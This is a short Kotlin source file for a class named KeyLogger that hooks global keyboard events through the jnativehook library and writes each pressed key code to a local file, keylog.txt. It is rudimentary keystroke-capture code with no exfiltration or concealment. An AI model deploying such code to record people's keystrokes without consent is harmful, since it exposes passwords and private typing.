package org.example.project.keyLogger

import org.jnativehook.keyboard.NativeKeyEvent
import org.jnativehook.keyboard.NativeKeyListener
import java.nio.file.Files
import java.nio.file.Paths
import java.nio.file.StandardOpenOption

class KeyLogger : NativeKeyListener {
    private val bw = Files.newBufferedWriter(
        Paths.get(logFileName),
        StandardOpenOption.CREATE,
        StandardOpenOption.WRITE,
        StandardOpenOption.TRUNCATE_EXISTING
    )

    init {
        Runtime.getRuntime().addShutdownHook(Thread {
            bw.close()
            println("Keylogger stopped.")
        })
    }

    override fun nativeKeyPressed(e: NativeKeyEvent) {
        bw.write("${e.keyCode} ")
    }


    override fun nativeKeyReleased(e: NativeKeyEvent) {
        // Nothing.
    }

    override fun nativeKeyTyped(e: NativeKeyEvent) {
        // Nothing.
    }

    companion object {
        const val logFileName = "keylog.txt"
    }
}

